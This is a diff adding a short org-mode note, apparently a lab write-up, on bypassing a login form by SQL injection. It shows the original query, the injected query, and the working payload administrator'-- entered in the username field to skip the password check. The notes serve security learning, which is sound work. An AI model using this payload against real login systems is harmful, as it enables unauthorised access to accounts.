@@ -1,0 +1,26 @@
+#+title: SQL injection vulnerability allowing login bypass
+
+* About
+
+** Sql injection
++ in the login function
+
+** End Goal
++ login as ~administrator~
+
+* Steps
+
+** Query for login system
+~dummy query~
+#+begin_SRC sql options
+SELECT username, password FROM users WHERE username = 'administrator' AND password = 'somepassword'
+#+end_SRC sql
+
+Now we can bypass the password if our sql becomes
+#+begin_SRC sql options
+SELECT username, password FROM users WHERE username = 'administrator'--' AND password = 'somepassword'
+#+end_SRC sql
+
+
+* Solution
+~Enter administrator'-- in username field~
